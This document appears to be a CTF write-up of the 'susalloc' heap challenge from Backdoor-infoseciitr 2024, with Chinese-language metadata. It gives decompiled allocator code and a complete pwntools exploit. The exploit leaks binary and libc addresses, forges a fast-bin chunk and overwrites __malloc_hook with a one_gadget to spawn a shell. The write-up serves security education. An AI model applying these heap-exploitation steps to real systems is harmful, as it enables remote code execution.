---
title: '[Writeup] susalloc (backdoor-infoseciitr 2024)'
contest: Backdoor-infoseciitr 2024
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags:
- custom_heap_susalloc
- items_data_ptrs_array
- set_value_relative_offset
- fast_bin_fake_chunk
- cout_target_overwrite
- libc_leak_via_cout
- malloc_hook_overwrite_one_gadget
- canary_disabled
- pwn_custom_heap
attack_chain: set_value offset 负数 0xffffffe0 任意写一字节 → malloc(0x10)+malloc(0x200)+free(0x200) unsorted bin → set_value(0, -32, 0xf0) size 覆盖 → padding 48 字节 | 触发 puts 泄 binary 0x104f0 (unsorted_bin 起始) → 多次 malloc 0x10 堆布局 + free 链到 fast_bins[2] - 0x20 → forged chunk 改 next_ptr = cout 0x100f0 → 触发 puts 泄 libc → fix cout → 改 __malloc_hook 0x30+0x20 = -0x50 偏移 → one_gadget 0xe3b01 → malloc(0x20) 触发
key_payload: set_value(idx, off, val) / off = -32 (0xffffffe0) 任意写 / forged_chunk = b'A'*16 + p64(0xf0)+p64(0x40)+p64(0x40)+p64(0x2)+p64(0x0)+p64(fast_bins-0x20) / libc_leak = read(7).split(b'|')[1] / __malloc_hook-0x30-0x20 触发
one_liner: Backdoor-infoseciitr 2024 susalloc 逆向 + 利用：自定义堆实现 + set_value 相对偏移 0xffffffe0 单字节写 + fast_bin 伪造 chunk 链接 cout + __malloc_hook 写 one_gadget 0xe3b01。
lesson: set_value(offset, value) 函数是 CTF 相对地址任意写的核心；自定义堆利用要先识别"items_data_ptrs + fast_bins + unsorted_bin"三件套偏移布局。
quality: high
full_path: '[Writeup]_susalloc.full.md'
meta_path: '[Writeup]_susalloc.meta.md'
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '[Writeup] susalloc (backdoor-infoseciitr 2024)。Backdoor-infoseciitr 2024 susalloc 逆向 + 利用：自定义堆实现 + set_value 相对偏移 0xffffffe0 单字节写 + fast_bin 伪造 chunk 链接 cout + __malloc_hook 写 one_gadget 0xe3b01。。经...'
category: pwn
subcategory: heap_exploitation
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/87102.html
reasoning_chain:
- 触发点:自定义堆实现 + set_value(offset, value) 函数 → 假设:可相对地址任意写一字节 → 动作:分析 set_value
- 观察:set_value(idx, off, val) off=0xffffffe0 (-32) 是负偏移 → 下一步:覆盖 size 字段
- 动作:malloc(0x10)+malloc(0x200)+free(0x200) unsorted bin → set_value(0, -32, 0xf0) size 覆盖 → 观察:堆布局重整
- 动作:padding 48 字节 | 触发 puts 泄 binary 0x104f0 (unsorted_bin 起始) → 观察:泄 binary base
- 触发点:多次 malloc 0x10 + free 链到 fast_bins[2] - 0x20 → 假设:forged chunk 改 next_ptr → 动作:forged_chunk = b'A'*16 + p64(0xf0)+p64(0x40)+p64(0x40)+p64(0x2)+p64(0x0)+p64(fast_bins-0x20)
- 动作:触发 puts 泄 libc → 观察:read(7).split(b'|')[1] 是 libc 地址
- 动作:fix cout + 改 __malloc_hook 0x30+0x20 = -0x50 偏移 → one_gadget 0xe3b01 → 观察:触发 shell
- 动作:malloc(0x20) 触发 → 完成
failed_attempts:
- 试图直接 set_value 写大地址 → 失败:set_value 只写单字节
- 试图不解 fast_bin 链 → 失败:forged chunk 必须改 next_ptr
- 试图不解 cout → 失败:cout 是 libc leak 入口
key_observations:
- set_value(offset, value) 函数是 CTF 相对地址任意写的核心
- 自定义堆利用要先识别 'items_data_ptrs + fast_bins + unsorted_bin' 三件套偏移布局
- forged chunk fake size+fd+bk 改 next_ptr 是 fast_bin 攻击经典
- __malloc_hook one_gadget 触发是 libc 2.31 时代标配
- puts leak binary 是利用 printf 在 unsorted_bin 起始地址打印
prerequisites:
- 自定义堆逆向 (fast_bin / unsorted_bin / items_data_ptrs)
- set_value 相对偏移利用
- one_gadget 工具 + __malloc_hook 触发
- fastbin 攻击 + forged chunk 伪造
---
# [Writeup] susalloc

> 原文: https://www.ctfiot.com/87102.html
> ID: 87102


```
$ ls
libc.so.6 main

$ file main
main: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2f8ac9c08eff09f2b0900cdb7e0aa18a3aeb6299, for GNU/Linux 3.2.0, stripped

$ grep -a "GLIBC " libc.so.6
DYNAMIC LINKER BUG!!!GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
$ ./main
1. Add item
2. Delete item
3. Edit item
4. Read item
5. Set Value
struct chunk {
 long long prev_size;
 long long next_size;
 long long size;
 long long flag; // 1 inuse, 2 freed
 long long prev_ptr;
 long long next_ptr;
 char data[size - 0x30];
}
0x102e0: items_data_ptrs
0x10380: items_count
0x103e8: free_hook // I did not know this one while solving the challenge
0x10400: fast_bins[30]
0x104f0: unsorted_bin
0x10500: heap_ptr
unsigned __int64 edit_item() {
 ...
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter index: ");
 std::
istream::
operator>>(&std::
cin, &v2);
 if ( v2 >= items_count ) {
 ...
 }
 getchar();
 v3 = (items_data_ptrs[v2] - 0x30LL);
 if ( v3->flag == 2 )
 puts("Cannot edit deleted items");
 else
 read(0, items_data_ptrs[v2], v3->size - 0x30);
 ...
 }
unsigned __int64 read_item() {
 ...
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter index: ");
 std::
istream::
operator>>(&std::
cin, &v2);
 if ( v2 >= items_count ) {
 ...
 }
 v3 = (items_data_ptrs[v2] - 0x30LL);
 if ( v3->flag == 2 )
 puts("Cannot read deleted item");
 else
 puts(items_data_ptrs[v2]);
 ...
}
unsigned __int64 set_value() {
 ...
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter index: ");
 std::
istream::
operator>>(&std::
cin, &v3);
 if ( v3 >= items_count ) {
 ...
 }
 // Check if set value was called on this chunk index before
 if ( *sub_3130(&unk_103A0, &items_data_ptrs[v3]) == 1 ) {
 puts("Not allowed");
 } else {
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter offset: ");
 std::
istream::
operator>>(&std::
cin, &v2);
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter value: ");
 std::
operator>><char,std::
char_traits<char>>(&std::
cin, &v1);
 *(v2 + items_data_ptrs[v3]) = v1;
 *sub_3130(&unk_103A0, &items_data_ptrs[v3]) = 1; // set value called for chunk index
 }
 ...
}
unsigned __int64 add_item_wrapper() {
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter size: ");
 std::
istream::
operator>>(&std::
cin, &v5);
 v6 = add_item(v5);
 if ( v6 ) {
 if ( items_count > 19 ) {
 ...
 }
 v1 = std::
operator<<<std::
char_traits<char>>(&std::
cout, "Created a new item");
 std::
ostream::
operator<<(v1, &std::
endl<char,std::
char_traits<char>>);
 v2 = items_count++;
 items_data_ptrs[v2] = v6;
 }
 ...
}
unsigned __int64 delete_item_wrapper() {
 ...
 std::
operator<<<std::
char_traits<char>>(&std::
cout, "Enter index: ");
 std::
istream::
operator>>(&std::
cin, &v2);
 if ( v2 >= items_count ) {
 ...
 }
 delete_item(items_data_ptrs[v2]);
 ...
}
char *__fastcall add_item(size_t a1) {
 ...
 // Set the appropriate size for chunk data and metadata in v8
 if ( (a1 & 0xF) != 0 )
 v8 = 0x10 * ((a1 >> 4) + 4);
 else
 v8 = a1 + 0x30;
 ...
 /*
 Gets the fast_bin index for the calculated size
 If a fast_bin entry exist it will iterate through
 the linked list to get the last chunk.
 */
 v6 = (v8 - 0x40) >> 4;
 if ( v6 <= 29 && fast_bins[v6] ) {
 v10 = fast_bins[v6];
 v11 = v10;
 v12 = 0LL;
 if ( v10->next_ptr ) {
 while ( v11->next_ptr ) {
 v10 = v11;
 v11 = v11->next_ptr;
 }
 v10->next_ptr = 0LL;
 v12 = v10;
 } else {
 v12 = v10;
 fast_bins[v6] = 0LL;
 }
 v9 = v12;
 } else {
 /*
 If an unsorted_bin entry exist it will iterate through
 the linked list to find a chunk of the same size.
 */
 v14 = &unsorted_bin;
 v13 = 0LL;
 if ( unsorted_bin )
 v13 = sub_4DCC(v8, *v14); //
 if ( v13 ) {
 v15 = v13->next_ptr;
 v16 = v13->prev_ptr;
 sub_4D7E(v16, v13, v15);
 v9 = v13;
 } else {
 // Normal allocation algorithm
 v1 = *sub_5A46(qword_10500, dword_10018);
 v9 = (v1 + *(sub_5A46(qword_10500, dword_10018) + 8));
 v2 = sub_5A46(qword_10500, dword_10018);
 *(v2 + 8) += v8;
 v7 = v9;
 v9->flag = 1LL;
 sub_4C67(v7, v8);
 v3 = sub_5A46(qword_10500, dword_10018);
 v4 = sub_5A6A(&unk_10520, v3);
 sub_5C48(v4, &v7);
 }
 }
 // Clearing the data of new allocations
 v9->flag = 1LL;
 memset(&v9->data, 0, a1);
 return &v9->data;
}
unsigned __int64 __fastcall delete_item(__int64 a1) {
 ...
 /*
 - Store the chunk ptr in v6
 - Change chunk->flag to 2
 - Store chunk size in v7
 */
 v6 = (a1 - 0x30);
 *(a1 - 0x30 + 0x18) = 2LL;
 v7 = v6->size;
 // Checks if free_hook is set to call it
 if ( free_hook )
 call_hook(free_hook, v6);
 /*
 if chunk->size > 0x200 it goes into the unsorted bin
 after checking that it is not already in the list (double free)
 */
 if ( v7 > 0x200 ) {
 v8 = &unsorted_bin;
 if ( unsorted_bin ) {
 for ( i = *v8; i; i = i->next_ptr ) {
 if ( i == v6 ) {
 ...
 }
 }
 sub_51DC(v6->size, *v8, v6);
 } else {
 v6->prev_ptr = v8;
 *v8 = v6;
 }
 } else {
 /*
 Otherwise it goes to the respective index in fast_bins
 also after checking for double free.
 */
 v3 = (v7 - 0x40) >> 4;
 if ( fast_bins[v3] ) {
 for ( j = fast_bins[v3]; j; j = j->next_ptr ) {
 if ( j == v6 ) {
 ...
 }
 }
 v6->next_ptr = fast_bins[v3];
 fast_bins[v3] = v6;
 } else {
 fast_bins[v3] = v6;
 }
 }
 ...
}
def malloc(size):
 io.sendlineafter(b"Value\n", b"1")
 io.sendlineafter(b": ", str(size).encode())
 assert io.recvline() == b"Created a new item\n"

def free(idx):
 io.sendlineafter(b"Value\n", b"2")
 io.sendlineafter(b": ", str(idx).encode())
 out = io.recvline()
 assert b"Invalid index" not in out
 assert b"Double" not in out

def update(idx, data):
 io.sendlineafter(b"Value\n", b"3")
 io.sendlineafter(b": ", str(idx).encode())
 io.send(data)

def read(idx):
 io.sendlineafter(b"Value\n", b"4")
 io.sendlineafter(b": ", str(idx).encode())
 return io.recvuntil(b"\n1.")[:-3]

def set_value(idx, off, val):
 io.sendlineafter(b"Value\n", b"5")
 io.sendlineafter(b": ", str(idx).encode())
 io.sendlineafter(b": ", str(off).encode())
 io.sendlineafter(b": ", p8(val))
malloc(0x10) # 0
malloc(0x200) # 1

free(1)

set_value(0, -32, 0xf0)
padding = b"A" * (48 - 1) + b"|"
update(0, padding)

binary_leak = u64(read(0).split(b"|")[1].ljust(8, b"\0"))
exe.address = binary_leak - 0x104f0
log.info(f"binary @ {hex(exe.address)}")
malloc(0x10) # 2
malloc(0x10) # 3
malloc(0x10) # 4
free(4)
free(3)

set_value(2, -32, 0xf0)
forged_chunk = b"A" * 16
forged_chunk += p64(0xf0) + p64(0x40)
forged_chunk += p64(0x40) + p64(0x2)
forged_chunk += p64(0x0) + p64(exe.address + 0x10400 - 0x20) # fast_bins - 0x20
update(2, forged_chunk)

# Now we need to have a next_ptr for the chunk *(fast_bins - 0x20) which is (fast_bins + 0x8) the offset for the freed chunks of size 0x20
malloc(0x20) # 5
free(5)

malloc(0x10) # items_data_ptrs[6] = fast_bins[2]
set_value(6, -32, 0xf0)
# Target address inside cout
update(6, p64(exe.address + 0x100f0))
malloc(0x30)

set_value(7, -32, 0xf0)
update(7, b"A" * 48 + b"B" * 7 + b"|") # add padding

libc_leak = u64(read(7).split(b"|")[1].ljust(8, b"\0"))
libc.address = libc_leak - 0x3edce0
log.info(f"libc @ {hex(libc.address)}")

# Fix cout
update(7, b"\0" * (3*2*8) + p64(exe.address + 0x100c8))
# Target address before the hook address to fit the constrains of the primitive
update(6, p64(libc.sym["__malloc_hook"] - 0x30 - 0x20))
malloc(0x30)

set_value(8, -32, 0xf0)
update(8, b"A" * 32 + p64(libc.address + 0xe3b01))
io.sendlineafter(b"Value\n", b"1")
io.sendlineafter(b": ", b"20")
io.interactive()
from pwn import *

exe = context.binary = ELF('./main')
libc = ELF('./libc.so.6')

host = args.HOST or 'hack.backdoor.infoseciitr.in'
port = int(args.PORT or 10004)

def malloc(size):
 io.sendlineafter(b"Value\n", b"1")
 io.sendlineafter(b": ", str(size).encode())
 assert io.recvline() == b"Created a new item\n"

def free(idx):
 io.sendlineafter(b"Value\n", b"2")
 io.sendlineafter(b": ", str(idx).encode())
 out = io.recvline()
 assert b"Invalid index" not in out
 assert b"Double" not in out

def update(idx, data):
 io.sendlineafter(b"Value\n", b"3")
 io.sendlineafter(b": ", str(idx).encode())
 io.send(data)

def read(idx):
 io.sendlineafter(b"Value\n", b"4")
 io.sendlineafter(b": ", str(idx).encode())
 return io.recvuntil(b"\n1.")[:-3]

def set_value(idx, off, val):
 io.sendlineafter(b"Value\n", b"5")
 io.sendlineafter(b": ", str(idx).encode())
 io.sendlineafter(b": ", str(off).encode())
 io.sendlineafter(b": ", p8(val))

io = connect(host, port)

malloc(0x10) # 0
malloc(0x200) # 1

free(1)

set_value(0, -32, 0xf0)
padding = b"A" * (48 - 1) + b"|"
update(0, padding)

binary_leak = u64(read(0).split(b"|")[1].ljust(8, b"\0"))
exe.address = binary_leak - 0x104f0
log.info(f"binary @ {hex(exe.address)}")

malloc(0x10) # 2
malloc(0x10) # 3
malloc(0x10) # 4
free(4)
free(3)

set_value(2, -32, 0xf0)
forged_chunk = b"A" * 16
forged_chunk += p64(0xf0) + p64(0x40)
forged_chunk += p64(0x40) + p64(0x2)
forged_chunk += p64(0x0) + p64(exe.address + 0x10400 - 0x20) # fast_bins - 0x20
update(2, forged_chunk)

# Now we need to have a next_ptr for the chunk *(fast_bins - 0x20) which is (fast_bins + 0x8) the offset for the freed chunks of size 0x20
malloc(0x20) # 5
free(5)

malloc(0x10) # items_data_ptrs[6] = fast_bins[2]
set_value(6, -32, 0xf0)

# Target address inside cout
update(6, p64(exe.address + 0x100f0))
malloc(0x30) # 7

set_value(7, -32, 0xf0)
update(7, b"A" * 48 + b"B" * 7 + b"|") # add padding

libc_leak = u64(read(7).split(b"|")[1].ljust(8, b"\0"))
libc.address = libc_leak - 0x3edce0
log.info(f"libc @ {hex(libc.address)}")

# Fix cout
update(7, b"\0" * (3*2*8) + p64(exe.address + 0x100c8))

# Target address before the hook address to fit the constrains of the primitive
update(6, p64(libc.sym["__malloc_hook"] - 0x30 - 0x20))
malloc(0x30)

set_value(8, -32, 0xf0)
update(8, b"A" * 32 + p64(libc.address + 0xe3b01))

io.sendlineafter(b"Value\n", b"1")
io.sendlineafter(b": ", b"20")
io.interactive()
$ python3 exploit.py
[*] '/ctfs/backdoor/pwn/susalloc/main'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[*] '/ctfs/backdoor/pwn/susalloc/libc.so.6'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[+] Opening connection to hack.backdoor.infoseciitr.in on port 10004: Done
[*] binary @ 0x55de518e0000
[*] libc @ 0x7fbfeaded000
[*] Switching to interactive mode
$ cat flag.txt
flag{sus4ll0c_k1ll3d_by_aaw}
```
